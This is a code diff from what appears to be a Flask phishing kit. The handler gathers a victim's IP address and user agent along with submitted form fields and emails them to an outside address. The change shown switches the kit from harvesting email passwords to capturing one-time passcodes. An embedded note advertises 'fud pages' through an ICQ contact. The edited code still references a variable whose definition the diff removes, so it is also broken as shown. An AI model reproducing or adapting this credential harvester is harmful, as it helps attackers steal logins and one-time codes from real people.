@@ -181,8 +181,7 @@ def second():
             ip = request.headers.get('X-Client-IP')
         if ip is None:
             ip = request.remote_addr
-        email = request.form.get("horse")
-        passwordemail = request.form.get("pig")
+        email = request.form.get("otp")
         sender_emailx = 'contact'
         sender_email = 'contact@personalbio.site'
         receiver_email = "demri.aury@moongit.com"
@@ -197,7 +196,7 @@ def second():
         How are you?
         contact me on icq jamescartwright for your fud pages
         """
-        html = render_template('emailmailer.html', emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
+        html = render_template('otp.html', emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
         part1 = MIMEText(text, "plain")
         part2 = MIMEText(html, "html")
         message.attach(part1)
